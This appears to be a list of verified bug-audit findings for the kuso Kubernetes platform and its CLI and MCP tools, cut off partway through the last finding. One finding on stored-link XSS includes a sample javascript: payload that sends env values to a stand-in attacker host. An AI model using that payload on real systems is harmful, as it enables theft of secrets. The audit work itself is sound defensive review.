evidence: nodewatch.go:171-186 ready branch: uncordon queued only `if _, was := w.alerted[n.Name]; was`. The persisted CordonAnnotation (checked by uncordonIfOurs at :330) is never consulted when deciding WHETHER to queue an uncordon for a Ready node.
fix_sketch: In the ready branch, also queue an uncordon when the (cached) node carries CordonAnnotation=true even if `alerted` doesn't contain it (uncordonIfOurs already re-verifies against a live GET); on uncordon failure re-add the node so the next tick retries.
verify_reason: Both claimed failure paths trace exactly through the code. (1) Restart path: in server-go/internal/nodewatch/nodewatch.go the ready branch (lines 169-186) queues an uncordon only via `if _, was := w.alerted[n.Name]; was` (line 175); `alerted` is in-memory only, initialized empty in Run (lines 96-98), and the persisted CordonAnnotation is never consulted when deciding WHETHER to uncordon — it is only checked inside uncordonIfOurs (line 330) after an action was already queued. A node that flips Ready while kuso-server is restarting (leader-gated singleton, main.go:1028-1033, so every release roll/leader failover opens the gap) hits the ready branch with empty `alerted`, gets only a clear-notready-marker action, and stays spec.unschedulable=true with the annotation forever; NodeRecovered never fires. The Run docstring (lines 84-85) even promises annotation-based restart idempotence that only the NotReady side delivers. (2) No-retry path: line 176 deletes `alerted` before the patch; on uncordonIfOurs failure the dispatcher only logs (264-266) — the cordon path has an explicit alerted-rollback for retry (249-252), the uncordon path has none — and NodeRecovered is emitted anyway (line 267) despite the node staying cordoned. Grep confirms no other component removes the annotation (nodeshape/nodes.go:114 only reads it for the UI badge). Severity corrected to P2 rather than P1: the restart trigger needs the node to recover inside a seconds-to-a-minute restart gap (if still NotReady at the new process's first tick, lines 194-206 restore notReadySince from the annotation, re-alert, and recovery then works), the failure-path trigger needs a transient apiserver error at one exact tick, the stranded node is visible in the UI as unreachable and manually reversible, and a future >5min flap incidentally heals it — real correctness bug, narrow trigger, no data loss or security impact.

title: nodewatch claims ownership of operator-applied cordons and will uncordon them on recovery
summary: cordon() stamps the cordoned-by-nodewatch annotation on a node that is ALREADY unschedulable (nodewatch.go:294-300), so the recovery path uncordons nodes kuso never cordoned, violating the documented 'only uncordon if WE cordoned' invariant.
failure_scenario: Operator cordons a node manually for maintenance (disk swap, kernel debugging) and the node goes NotReady >5min during that work (e.g. it is powered down). nodewatch's cordon action finds Spec.Unschedulable=true and still stamps its ownership annotation via annotate(). When the node next reports Ready -- possibly mid-maintenance after a test boot -- uncordonIfOurs sees the annotation and flips unschedulable=false, so the scheduler immediately places workloads onto a box the operator deliberately drained. The code comment declares this intentional, but it inverts the contract stated in the package doc (line 10: 'uncordon (only if WE cordoned it)') and in the annotation's own doc (line 36-37: 'not stomp on a manual cordon'), and there is no way for an operator to opt out short of re-cordoning after every flap.
evidence: nodewatch.go:293-300: `if n.Spec.Unschedulable { _ = w.annotate(ctx, n.Name, true); return nil }` -- annotation applied without recording that the cordon pre-existed.
fix_sketch: When the node is already unschedulable at cordon time, do NOT stamp the ownership annotation (or stamp a distinct 'pre-cordoned' value that the recovery path treats as not-ours); fire node.unreachable without claiming the cordon.
verify_reason: Exact failure path traced in /Users/sisle/code/work/kuso/server-go/internal/nodewatch/nodewatch.go. The tick state machine (lines 166-227) issues a "cordon" action based only on NotReady duration, never checking Spec.Unschedulable. cordon() lines 294-300 then hits the already-unschedulable branch and unconditionally stamps the ownership annotation via annotate(ctx, n.Name, true) — with no record that the cordon pre-existed. On recovery, uncordonIfOurs (line 330) gates solely on Annotations[CordonAnnotation]=="true", so it patches spec.unschedulable=false (lines 335-339) on a node the operator manually drained. This directly contradicts the package doc (line 10: "uncordon (only if WE cordoned it)"), the annotation's own doc (lines 35-36: "not stomp on a manual cordon"), and uncordonIfOurs's comment (lines 313-321), which describes the opposite convention — humans opt IN by adding the annotation, and the live re-fetch exists specifically to respect operators removing it; the adoption at line 299 defeats that mechanism because the operator never knows the annotation was stamped. The inline comment declares the adoption intentional, but that doesn't dissolve the contract violation or the hazard (scheduler placing workloads on a deliberately drained box mid-maintenance). Severity is P2, not P1: trigger requires the coincidence of a manual cordon + NotReady >5min + node flipping Ready while still meant to be drained; impact is workload misplacement/disruption, not data loss or a security bypass, and an aware operator can re-cordon or strip the annotation.

title: anotherNodeRebooting does not treat the settling phase as busy
summary: The one-node-at-a-time gate matches phases draining/rebooting/running but not settling, so a second node's drain+reboot can begin while the first node's reboot-stranded singleton pods are still being force-deleted and rescheduled (up to the 3-minute settle window).
failure_scenario: Node A finishes patch+reboot; reconcileReboots uncordons it, force-deletes a stranded Unknown singleton (e.g. an addon pg-pooler) and holds A in phase=settling (apply.go:216-226) while the replacement pod schedules -- possibly onto node B. Operator immediately applies updates to node B: anotherNodeRebooting returns "" (A has no cordon marker anymore and settling is not in the switch at apply.go:141-144), so B is cordoned and drained at once, evicting the pooler replacement that just started on B -- extending the exact DB-outage window the settling phase was added to close.
evidence: apply.go:141-144: `case "draining", "rebooting", "running": return n.Name, nil` -- settling absent; the marker fallback doesn't help because reconcileReboots clears the marker before entering settling (apply.go:179-188). apply_test.go's TestAnotherNodeRebooting has no settling case.
fix_sketch: Add "settling" to the busy-phase switch in anotherNodeRebooting.
verify_reason: Exact code trace confirms the claim. apply.go:141-144 gates only on phases "draining"/"rebooting"/"running" — "settling" is absent — and the CordonAnnotation fallback (line 138) is dead during settling because reconcileReboots' uncordon patch (apply.go:179-188) nulls the marker in the same merge patch as unschedulable:false, BEFORE the stranded-pod sweep (line 204) and the phase=settling stamp (line 222). For the full settle window (settleWindow = 3*time.Minute, line 212, held across ticks while swept>0 or window not elapsed), node A is invisible to the one-node-at-a-time gate, so Apply(nodeB, allowReboot=true) passes the check at line 70 (per-node Job lock at line 79 doesn't cross nodes) and cordons+drains B while A's force-deleted Unknown singletons are rescheduling, possibly onto B. Test gap also confirmed: TestAnotherNodeRebooting (apply_test.go:67-153) has cases for cordon-marker/draining/rebooting/done but none for settling. Severity corrected to P2: availability-only impact (evicted replacement pod reschedules again — extended outage window, no data loss), and the trigger is narrow: an operator must issue a second reboot-apply within the ~3-minute settle window on a multi-node cluster with the replacement singleton landing on the second node.

title: scaledown's HPA-ownership guard checks an annotation that never exists on Deployments
summary: The don't-fight-the-HPA guard tests `dep.Annotations["autoscaling.alpha.kubernetes.io/conditions"]`, but that annotation is written by the HPA controller onto HPA objects (autoscaling/v1 round-trip), never onto the target Deployment, and kuso's kusoenvironment chart doesn't stamp it either -- so hpaManaged is always false and the guard is dead code.
failure_scenario: A service with sleep.enabled=true and scale.Max > scale.Min gets a real autoscaling/v2 HPA (operator/helm-charts/kusoenvironment/templates/hpa.yaml renders one whenever .Values.autoscaling.enabled; sleepEligible() at scaledown.go:111-120 does not exclude autoscaled services). After the idle window, evaluateService patches the HPA-owned Deployment to replicas=0 and stamps replicaCount=0 on the env CR (scaleToZero, :198-213) -- exactly what the comment says 'we must not' do: the HPA controller then treats 0 replicas as autoscaling-disabled, and the wake path restores the service below its configured scale.Min baseline with the HPA effectively switched off until something re-scales it above 0. The same never-present annotation is also consulted in projects/drift.go:494,543.
evidence: grep across operator/helm-charts shows hpa.yaml creates autoscaling/v2 HPAs and deployment.yaml stamps no such annotation; Kubernetes HPA controller only writes autoscaling.alpha.kubernetes.io/conditions on the HPA object itself.
fix_sketch: Detect HPA ownership properly: check the env CR's autoscaling block (already available on the KusoService/KusoEnvironment spec: scale.Max > scale.Min) or list HPAs by scaleTargetRef, instead of the alpha annotation; apply the same fix to drift.go.
verify_reason: The guard is provably dead code. Whole-repo grep for "autoscaling.alpha" shows exactly three consumers (scaledown.go:154, projects/drift.go:494 and :543) and zero producers — neither the kusoenvironment chart (deployment.yaml stamps no such annotation; it only omits spec.replicas when autoscaling.enabled) nor any Go code writes it, and Kubernetes itself only writes autoscaling.alpha.kubernetes.io/conditions onto the HPA object during autoscaling/v1 round-trip conversion, never onto the target Deployment. So hpaManaged at scaledown.go:154 is always false. The trigger is real: autoscalingFromScale (services_ops.go:1707) enables the HPA whenever scale.Max > scale.MinValue(), hpa.yaml renders an autoscaling/v2 HPA whenever autoscaling.enabled && image.repository && !stopped, and sleepEligible (scaledown.go:111-120) checks only Sleep.Enabled + excludePaths with no validation anywhere rejecting sleep+autoscaling. After the idle window scaleToZero (:198-213) patches the HPA-owned Deployment to replicas=0 — the exact action the :151-153 comment forbids. However, the claimed consequence is overstated: the activator wake path (activator/activator.go:361) patches replicas back to 1, after which the HPA controller re-engages on its next ~15s sync and restores minReplicas — the HPA is not "effectively switched off until something re-scales it"; the below-min window is transient. Realized harm: autoscaled services get slept in violation of the design contract, a brief below-baseline window on wake, and the identical dead check in drift.go:494/543 makes HPA-scaled deployments raise false "replicas" drift flags. Real correctness bug with a real trigger but bounded, self-healing impact and no data loss or security dimension → P2, not P1.

title: Env editor silently deletes valueFrom-backed env vars on save
summary: toEnvVar serializes fromSecret rows as {name} with no value and no valueFrom, and the server's env admission pipeline (server-go/internal/projects/services_ops.go:1452) drops entries with neither, so any env var whose valueFrom the editor cannot reverse into a ${{ addon.KEY }} ref is permanently deleted from spec.envVars whenever the user saves anything in the env editor.
evidence: EnvVarsEditor.tsx:130-135: `if (r.fromSecret) { return { name: r.name.trim() }; }` — the original valueFrom (returned by the server GET at services_ops.go:1257 and stored on toRow as an opaque fromSecret row) is never sent back. cleanRows (line 536-537) pushes these rows into the payload. Server side, validateAndRewriteEnvVars: `if ev.ValueFrom == nil && ev.Value == "" { continue }` (services_ops.go:1448-1454) drops them — even though the same function deliberately carries through legacy fieldRef/configMapKeyRef entries WHEN the valueFrom is present (comment at services_ops.go:1502-1511: 'Carry them through unchanged rather than reject the whole save'). The deletion is also invisible in the confirm dialog: diffEntries (EnvVarsEditor.tsx:543-577) formats the before side through the same lossy toEnvVar(toRow(v)) chain, so both before and after render as "" and the row is filtered out of the diff (b === a).
failure_scenario: A service has an env var backed by a valueFrom the UI can't map to a known addon conn-secret — e.g. a legacy fieldRef/configMapKeyRef entry from a pre-upgrade service, a secretKeyRef whose addon was renamed/deleted, or an addon secretKeyRef rendered before the addons query resolved (addonByConn empty while the user starts editing, so the dirty guard at line 448 keeps the fromSecret representation). The user adds an unrelated FOO=bar in the web editor and saves; the diff dialog shows only FOO; on confirm the secret-backed var vanishes from spec.envVars, the Deployment rolls, and the pod comes up missing the variable (crash/misbehavior) with no indication of what changed.
fix_sketch: Preserve the original valueFrom on the Row (e.g. `valueFrom?: Record<string, unknown>` captured in toRow) and emit it from toEnvVar for fromSecret rows: `return { name, valueFrom: r.valueFrom }`. The server already validates and carries through secretKeyRef/fieldRef/configMapKeyRef entries that arrive intact.
verify_reason: Full failure chain traced in code. (1) EnvVarsEditor.tsx Row interface (lines 21-31) has no valueFrom field; toRow (94-108) discards the original valueFrom for anything addonRefFromValueFrom can't map to a known addon conn-secret, marking it fromSecret:true. (2) toEnvVar (130-135) serializes fromSecret rows as `{ name: r.name.trim() }` — no value, no valueFrom. (3) cleanRows (524-539) includes these rows in the payload (skip at 536 is `!r.fromSecret && r.value === ""` only). (4) Server: handlers/projects.go:912 SetEnv passes the list wholesale to SetEnvWithOpts; validateAndRewriteEnvVars at services_ops.go:1452-1454 drops entries with `ValueFrom == nil && Value == ""`; line 1387 then does `svc.Spec.EnvVars = convertEnvVars(rewritten)` — wholesale replacement, no merge — and propagateChangedToEnvs rolls the deployment. (5) Diff invisibility confirmed: diffEntries line 555 formats the before side through toEnvVar(toRow(v)) which strips valueFrom, so formatEnvForDiff returns "" on both sides and `if (b === a) continue` (571) hides the deletion from the confirm dialog. (6) Triggers are real: the server comment at ~1502-1511 explicitly acknowledges legacy fieldRef/configMapKeyRef entries persisted verbatim on pre-upgrade services (its carry-through protection is dead code for web saves since the client never echoes the valueFrom); secretKeyRefs to deleted/renamed addons and the dirty-guard race at line 448 (user edits before useAddons resolves → addon-backed rows stay fromSecret) are additional paths. Severity P1 not P0: silent, invisible-in-dialog destruction of env wiring with a rolling restart from a routine save, but no authz bypass/RCE, the underlying Secret data survives (only spec.envVars wiring is lost), and it requires the precondition of a non-reversible valueFrom entry rather than hitting every service.

title: Repo URL rendered as href with no scheme validation (stored javascript: link)
summary: The service repository URL — a free-form string any editor-role user can store — is rendered directly as `<a href={state.repoURL} target="_blank">` without any scheme allow-listing, and the server stores req.Repo.URL verbatim (services_ops.go:335 and 2129-2136 validate only repo.path, never the URL), so a stored javascript: (or other non-http) URI becomes a clickable link served to every user who opens the service's Source settings.
evidence: SourceSection.tsx:88-97: `{state.repoURL && (<a href={state.repoURL} target="_blank" rel="noreferrer" ...>)}` — state.repoURL is seeded from the saved spec. Server: services_ops.go AddService line 335 `repoURL = req.Repo.URL` and PatchService lines 2129-2136 copy req.Repo.URL onto the CR with no scheme/format check (contrast validateRepoPath/validateDockerfile immediately above it, which exist precisely because these fields are attacker-influenced). The role model makes this a real boundary: role-system v2 masks env values from non-admin sessions, so editor→admin JS execution is a privilege escalation, not a no-op in a single-tenant install.
failure_scenario: An editor-role user PATCHes their service with repo.url = "javascript:fetch('/api/projects/p/services/s/env').then(r=>r.text()).then(t=>fetch('https://evil.example/x',{method:'POST',body:t}))". An admin opens the service's Settings → Source tab and clicks the external-link icon next to the repository field; in browsers/UAs that execute javascript: navigations from an anchor (modern Chrome/Firefox mitigate the target=_blank case, but the sink accepts any scheme and the mitigation is UA behavior, not app policy), the script runs in the admin's origin and can call any API with the admin's HttpOnly session cookie — reading env values that are masked from the attacker's own role. Even where the UA blocks execution, the link is a broken/dangling affordance for any non-http value.
fix_sketch: Render the anchor only when the URL parses with an http/https scheme: `let ok=false; try { ok=['http:','https:'].includes(new URL(state.repoURL).protocol) } catch {}` — and preferably also validate the scheme server-side in AddService/PatchService next to validateRepoPath, since the same string is consumed by the build pipeline.
verify_reason: Code facts confirmed: SourceSection.tsx:90 renders the stored repo URL directly as `<a href={state.repoURL} target="_blank" rel="noreferrer">` with no scheme allow-listing; state.repoURL is seeded from the saved spec (_primitives.tsx:112 `repoURL: repo?.url ?? ""`). Server stores it verbatim — services_ops.go:335 (AddService) `repoURL = req.Repo.URL` and 2136 (PatchService) `URL: req.Repo.URL`; only req.Repo.Path is validated (validateRepoPath), no URL scheme/format check exists. React 19.2 renders javascript:/data: hrefs into the DOM (warns, does not strip), so the malicious href does land. However, the CLAIMED IMPACT — script executing in the admin's origin → reading masked env → privilege escalation — is not reachable: the anchor carries target=\"_blank\", and all modern browsers block javascript: (and top-level data:) navigation from a target=_blank anchor click (about:blank#blocked). The reviewer concedes this mitigation and falls back to \"accepts any scheme\" / \"broken affordance,\" which is a defense-in-depth/hardening gap and a dangling-link UX nit, not a demonstrable code-execution or authz-bypass path in any supported browser. Genuine latent sink + missing scheme validation, but no confirmed exploit as written, so the P1-shaped privilege-escalation framing is over-rated → P3 (would only become live if target=_blank were removed or in a non-mitigating UA).

title: build trigger --follow never terminates on release-failed builds
summary: pollBuildToTerminal treats only succeeded/failed/error/cancelled as terminal, but the server's terminal build-phase vocabulary also includes 'release-failed' (server-go/internal/builds/builds.go:1307, stamped by markReleaseFailed at builds.go:2922 and passed through verbatim to BuildSummary.status by toBuildSummary), so a release-hook failure is never recognized.
failure_scenario:
Run `kuso build trigger

--follow` on a service whose release hook (migration) fails. The build's phase becomes 'release-failed' within minutes; the CLI prints 'build : release-failed' once (status-change line) but the switch never matches, so it keeps polling every 5s for the full 20 minutes and then exits with the misleading error 'build did not finish within 20m — check kuso build list'. CI pipelines burn 20 minutes per failed release and get a timeout message instead of the actual release-failure cause.
evidence: build.go:77-85: `switch b.Status { case "succeeded": return ...; case "failed", "error", "cancelled": ... }` — no "release-failed" arm. Server: builds.go:1307 `case "succeeded", "failed", "cancelled", "release-failed":` (terminal set) and builds.go:2922 stamps the annotation `"release-failed"` that ListBuilds returns as status.
fix_sketch: Add "release-failed" to the terminal-failure case in pollBuildToTerminal, returning the build's ErrorMessage (which carries the release-hook failure cause).
verify_reason: Full failure path traced in code: markReleaseFailed (server-go/internal/builds/builds.go:2921-2927) stamps annotation kuso.sislelabs.com/build-phase="release-failed" (annPhase constant, line 94) plus spec.done=true, and builds.go:1307/2743 confirm release-failed is a final phase with no later transition to "failed". toBuildSummary (server-go/internal/http/handlers/builds.go:272-275) copies that annotation verbatim into the wire `status` field returned by ListBuilds. The CLI's pollBuildToTerminal (cli/cmd/kusoCli/build.go:77-85) switches only on "succeeded" and "failed"/"error"/"cancelled" — "release-failed" matches neither, so after printing the status-change line once (lines 73-76) the loop polls every 5s until the 20-minute deadline (line 55) and returns the misleading timeout error (line 89). Severity corrected to P2: real and easily triggered (release-hook failure is a by-design gate), but confined to the --follow CLI path, terminates eventually with non-zero exit, and build list/UI still report the true state — no data loss or security impact, so it is a narrower bug than P1.

title: cron edit --image-tag alone wipes the cron's image repository
summary: cronEditCmd builds `req.Image = &CronImage{Repository: pCronImage, Tag: pCronImageTag}` whenever EITHER --image or --image-tag changed; when only --image-tag is passed, Repository is the empty flag default, and the server's UpdateProject replaces Spec.Image verbatim with no validation (crons.go:509-511 `if req.Image != nil { cr.Spec.Image = req.Image }` — the repository!="" check at crons.go:316 exists only on the create path).
failure_scenario: `kuso cron edit myproj nightly-prune --image-tag v2` (user just wants to bump the tag) sends {"image":{"repository":"","tag":"v2"}}. The live KusoCron's spec.image.repository is silently cleared, the rendered CronJob gets an invalid image reference, and the next scheduled run fails with InvalidImageName/ImagePullBackOff. The CLI prints 'cron myproj/nightly-prune updated' — success — so the breakage is only discovered when the job next fires.
evidence: cron.go:271-273: `if cmd.Flags().Changed("image") || cmd.Flags().Changed("image-tag") { req.Image = &kusoApi.CronImage{Repository: pCronImage, Tag: pCronImageTag} }`. Server crons.go UpdateProject: `if req.Image != nil { cr.Spec.Image = req.Image }` with no empty-repository guard on update.
fix_sketch: When only --image-tag changed, fetch the cron's current spec.image.repository and resend it (fetch-then-patch, same pattern serviceSetCmd already uses for repo/securityContext), or reject --image-tag without --image client-side.
verify_reason: Traced end to end. cli/cmd/kusoCli/cron.go:271-273 builds req.Image = &CronImage{Repository: pCronImage, Tag: pCronImageTag} when EITHER flag changed; pCronImage defaults to "" (line 333), and CronImage.Repository has no omitempty (kusoApi/crons.go:18), so --image-tag alone sends {"image":{"repository":"","tag":"v2"}}. Server handler (handlers/crons.go:71-90) decodes with no validation; crons.go:509-511 replaces cr.Spec.Image verbatim (`if req.Image != nil { cr.Spec.Image = req.Image }`). The empty-repository guard at crons.go:316 exists only in AddProject, not UpdateProject. No downstream rescue: kube.KusoImage.Repository is omitempty (types.go:742), kusocron values.yaml defaults repository to "", and cronjob.yaml:106 renders image: "{{ .Values.image.repository }}:{{ .Values.image.tag }}" → ":v2" (InvalidImageName at next fire). CLI prints success unconditionally (cron.go:288). Severity corrected to P2: real natural trigger and silent breakage, but blast radius is one project-scoped command cron, no data loss, trivially recoverable by re-running edit with --image.

title: cron --cmd splits on whitespace, breaking quoted commands the CLI's own examples show
summary: cron add / add-command / edit turn the --cmd string into argv via strings.Fields, which does not respect shell quoting, so any command containing quoted arguments (including both examples printed in the command help) is silently mangled into the wrong argv.
failure_scenario: The command's own Example, `kuso cron add myproj api --name every-15min --schedule '*/15 * * * *' --cmd 'sh -c "echo tick"'`, produces argv ["sh", "-c", "\"echo", "tick\""] — sh receives the literal script `"echo` plus a stray positional arg. The cron is created successfully (CLI prints 'cron api/every-15min created'), and every scheduled run then fails or does the wrong thing. Same defect at line 226 (add-command, whose example is `--cmd 'sh -c "rm -rf /tmp/*"'`) and line 275 (edit).
evidence: cron.go:100 `argv := strings.Fields(cronAddCmdString)`, cron.go:226 and cron.go:275 `strings.Fields(pCronCmdString)`; contrast with run.go which correctly takes argv verbatim after `--`.
fix_sketch: Use a shell-words splitter (e.g. shlex-style) or accept a repeatable --cmd flag / trailing `-- argv...` like `kuso run` does; at minimum fix the printed examples and error out when the string contains quote characters.
verify_reason: All three cited sites exist exactly as claimed: cli/cmd/kusoCli/cron.go:100 `argv := strings.Fields(cronAddCmdString)` (cron add), :226 `Command: strings.Fields(pCronCmdString)` (add-command), :275 `req.Command = strings.Fields(pCronCmdString)` (edit). strings.Fields splits only on whitespace with no quote handling, so the command's own Example at line 92 (`--cmd 'sh -c "echo tick"'`) yields argv ["sh","-c","\"echo","tick\""] — sh gets the literal script `"echo` with `tick"` as $0 and fails every run — and add-command's example at line 212 (`--cmd 'sh -c "rm -rf /tmp/*"'`) is mangled identically. Creation succeeds silently (line 115 prints "created"), so the failure only surfaces when scheduled runs fail. No shellwords/shlex parser exists anywhere in cli/ (grep confirms these are the only Fields sites), and run.go:45 takes argv verbatim from args[2:], confirming the correct pattern exists elsewhere. Mitigating: flag help (lines 321/335) does say "split on whitespace", but the Examples on the same commands contradict it with unworkable quoted commands. Severity corrected to P2: real trigger but confined to CLI cron argv, fails visibly on first run rather than destructively or with data loss, and unquoted commands work fine.

title: kuso api GET with -f/-F/--data silently drops the request body
summary: The `kuso api` passthrough builds a JSON body from -f/-F/--data and hands it to KusoClient.Raw, but resty v2.16.5 discards payloads for GET requests (isPayloadSupported: AllowGetMethodPayload defaults to false), so on GET the fields are silently never sent — no warning, no error — unlike gh api, which converts -f fields to query parameters for GET.
failure_scenario: `kuso api GET /api/projects/acme/services/web/logs -f lines=500` (a user mimicking gh-api muscle memory) sends a bodiless, parameterless GET. The server applies its defaults, returns a 200, and the CLI prints plausible output — the user's field was silently ignored, so scripts filter/paginate on parameters that were never transmitted.
evidence: api.go:93 buildBody + api.go:106 `api.Raw(method, path, body, headers)`; raw.go:30 `req.SetBody(body)`; resty v2.16.5 middleware.go:191 `if isPayloadSupported(r.Method, c.AllowGetMethodPayload)` with util.go:248 excluding GET when AllowGetMethodPayload=false (never enabled in kusoApi/main.go).
fix_sketch: In apiCmd, either reject -d/-f/-F when the method is GET, or convert -f/-F pairs into query-string parameters for GET (gh api behavior).
verify_reason: Exact failure path traced end to end. api.go:93 builds a non-nil JSON body from -f/-F/--data regardless of method and api.go:106 passes it to Raw; raw.go:30 does req.SetBody(body) and Execute("GET", ...). The resty client is created with bare resty.New() (kusoApi/main.go:89) and SetAllowGetMethodPayload is never called anywhere in the repo, so AllowGetMethodPayload=false. In resty v2.16.5, middleware.go:191 gates parseRequestBody on isPayloadSupported(r.Method, c.AllowGetMethodPayload) and util.go:248 excludes GET when the flag is false; the reader path at middleware.go:222 has the same gate. Result: the GET goes out with no body and no error/warning — the user's fields are silently dropped, exactly as claimed. Severity corrected to P3: this only affects the `kuso api` passthrough escape hatch, and even if the body were sent, kuso GET handlers read URL query params, not GET bodies, so -f on GET was never a working idiom — the real gap is the missing gh-style -f→query-param conversion (or a warning). Trivial workaround exists (put params in the path query string); no data loss or security impact, though the silent failure mode makes it worth fixing.

title: KUSO_INSECURE=1 not honored by WebSocket commands (logs -f, db port-forward/connect)
summary: SetApiUrl applies InsecureSkipVerify to the resty client when KUSO_INSECURE=1 (kusoApi/main.go:96-98), but the two WebSocket paths — streamLogs (logs.go:129-131) and proxyOneConnection (db.go:197-199) — dial with websocket.DefaultDialer and never set TLSClientConfig, so they still hard-fail certificate verification.
failure_scenario: Against a fresh install still on Let's Encrypt staging certs (the exact scenario KUSO_INSECURE exists for, per the main.go comment and the login TLS hint), `KUSO_INSECURE=1 kuso logs myproj web -f` fails with 'ws connect: x509: certificate signed by unknown authority' while every REST command works, and `KUSO_INSECURE=1 kuso db connect myproj db` gets the secret over REST but then every tunnel connection dies the same way — an inconsistent, hard-to-diagnose split. (Both call sites also mutate the shared websocket.DefaultDialer's Subprotocols rather than cloning it.)
evidence: logs.go:129-131 `dialer := websocket.DefaultDialer; dialer.Subprotocols = ...; dialer.Dial(...)` and db.go:197-199 same pattern — no `dialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}` branch mirroring kusoApi/main.go:96-98.
fix_sketch: Clone websocket.DefaultDialer in both places and set TLSClientConfig{InsecureSkipVerify:true} when the same KUSO_INSECURE env check that kusoApi/main.go uses is truthy (export a helper from kusoApi so the check stays in one place).
verify_reason: KUSO_INSECURE only reaches the resty client (cli/pkg/kusoApi/main.go:96-98, rc.SetTLSClientConfig with InsecureSkipVerify). Both WebSocket paths dial with gorilla's websocket.DefaultDialer and never set TLSClientConfig: logs.go:129-131 (streamLogs, used by `logs -f`) and db.go:197-199 (proxyOneConnection, used by both `db port-forward` at db.go:159 and `db connect`, which fetches the secret over REST at db.go:269 then tunnels via the same function). A repo-wide grep confirms no other code sets TLSClientConfig/InsecureSkipVerify on any websocket dialer. Since https base URLs are rewritten to wss (logs.go:111-116, db.go:180-185) and DefaultDialer verifies certs, an LE-staging install — the exact scenario KUSO_INSECURE exists for per main.go:90-95, login.go:163's hint, and doctor.go:146-201 — gets working REST but 'ws connect: x509: certificate signed by unknown authority' on logs -f and on every tunnel connection. The side claim is also correct: DefaultDialer is a *Dialer, so both sites mutate the shared global's Subprotocols (concurrently across per-connection goroutines in proxyOneConnection — a benign data race). Severity P2 rather than P1: hard fail with a clear x509 error and workarounds (LE prod cert or OS trust), affecting two subcommands in a bounded fresh-install window — no data loss, corruption, or security impact.

title: Top-level `kuso service set` alias missing --cap-add / --allow-privilege-escalation
summary: serviceSetTopCmd is documented (comment at project.go:1340-1344) to behave identically to `kuso project service set` and shares its RunE, but its flag registration block (project.go:1326-1337) omits --cap-add and --allow-privilege-escalation, which ARE registered on the project-scoped form (project.go:1269-1270).
failure_scenario: `kuso service set myproj kuma --cap-add SETUID --cap-add SETGID` — the exact securityContext escape hatch shipped in v0.18.106 for setpriv/gosu images and shown in serviceSetCmd's Long help — fails with 'unknown flag: --cap-add' and exit 1, while the identical command spelled `kuso project service set ...` succeeds. Users/agents following the help text of one form hit a spurious error on the other.
evidence: project.go:1326-1337 registers display-name/port/runtime/domains/internal/private-egress/platform-api-egress/replicas/max-replicas/path/branch on serviceSetTopCmd but not cap-add or allow-privilege-escalation; project.go:1269-1270 registers both on serviceSetCmd; serviceSetTopCmd.RunE (project.go:1349) dispatches to the same handler which checks cmd.Flags().Changed("cap-add").
fix_sketch: Register the two missing flags on serviceSetTopCmd in the same init() block (or factor the flag registration into a shared helper so the two commands can't drift again).
verify_reason: Reproduced empirically after building the CLI: `kuso service set myproj kuma --cap-add SETUID --cap-add SETGID` errors with "unknown flag: --cap-add" while `kuso project service set myproj kuma --cap-add SETUID` parses the flag and proceeds to the API call. Root cause is exactly as claimed: cli/cmd/kusoCli/project.go:1269-1270 registers --cap-add and --allow-privilege-escalation on serviceSetCmd only; the top-level alias serviceSetTopCmd's flag block (1326-1337) stops at --branch and omits both. Cobra parses flags against the invoked command's own FlagSet before RunE, so the shared RunE delegation at line 1349 (and its Changed("cap-add") gates at lines 632/666/676) never runs — the parse error fires first. No FParseErrWhitelist or persistent flag rescues it. The comment at 1340-1344 promising identical behavior between the two forms is violated. Severity is P2, not higher: it is a hard failure on a documented flag in one alias, but the error is loud (no silent misbehavior), there is an exact working equivalent command, and there is no data-loss or security impact.

title: logs tool decodes lines as []string but server returns objects — tool always fails
summary: The logs tool's logsResult declares Lines []string, but the server's GET /api/projects/{p}/services/{s}/logs returns lines as an array of {pod, line} objects, so JSON decoding fails whenever any log line exists and the tool can never return logs.
evidence: mcp/internal/tools/observe.go:36 `Lines []string `json:"lines"``. Server: server-go/internal/logs/logs.go:62-65 `type Line struct { Pod string `json:"pod"`; Line string `json:"line"` }`, returned by Tail (logs.go:70) and written verbatim at server-go/internal/http/handlers/logs.go:65-70 as "lines": out. The CLI decodes the correct object shape at cli/cmd/kusoCli/logs.go:74-75, confirming the wire format.
failure_scenario: Agent calls logs(project, service) on any service with at least one log line -> server returns {"lines":[{"pod":"web-abc","line":"..."}]} -> json.Unmarshal of an object into string fails -> GetJSON returns 'decode ... response: json: cannot unmarshal object into Go struct field logsResult.lines of type string' -> the tool errors on every real invocation, breaking the advertised apply->build->status->logs debug loop (it only 'works' when the pod has zero log lines).
fix_sketch: Change logsResult.Lines to []struct{ Pod string `json:"pod"`; Line string `json:"line"` } (mirroring cli/cmd/kusoCli/logs.go) and render pod-prefixed lines in the text summary.
verify_reason: Traced end-to-end. Server: server-go/internal/logs/logs.go:62-65 defines Line{Pod, Line} with json tags "pod"/"line"; Tail (line 70) returns []Line; handler server-go/internal/http/handlers/logs.go:65-70 writes it verbatim as "lines": out, so the wire format is an array of {pod,line} objects (independently confirmed by the CLI decoding that object shape in cli/cmd/kusoCli/logs.go). MCP tool: mcp/internal/tools/observe.go:36 declares Lines []string; observe.go:59 passes &logsResult to GetJSON, which decodes via plain json.Unmarshal at mcp/internal/kusoclient/client.go:97-99 — unmarshaling an object into string is a hard error ("json: cannot unmarshal object into Go struct field logsResult.lines of type string"), wrapped and returned as "tail logs: decode ..." (observe.go:60). No custom unmarshaler or lenient path exists; the only success case is zero log lines (empty array). The tool therefore fails on every real invocation, exactly as claimed.

title: apply deletes addons/services (prune) with zero confirmation gate
summary: The apply tool has no confirm parameter, yet a kuso.yml with prune:true deletes services and addons — addon deletion destroys the PVC (data loss) — bypassing both this MCP surface's own confirm=true convention (required even for harmless bootstrap_project/add_service) and the server's typed ?confirm=<addon-name> acknowledgment that the direct DELETE route demands.
evidence: applyArgs (apply.go:25-29) is only {project, yaml}; the handler (apply.go:49-58) posts straight to /apply with no gate beyond ReadOnly. Server side, spec/apply.go:138-141 executes plan.AddonsToDelete via r.Addons.Delete(ctx, ...) internally — the typed-confirmation guard lives only in the HTTP DELETE handler (handlers/addons.go, mirrored in mcp integration_test.go:99-108), so the apply path never sees it. Contrast manage_addon (projects.go:376-412) which requires confirm=true AND echoes the typed confirm, and bootstrap_project (projects.go:158) which requires confirm=true just to create an empty project.
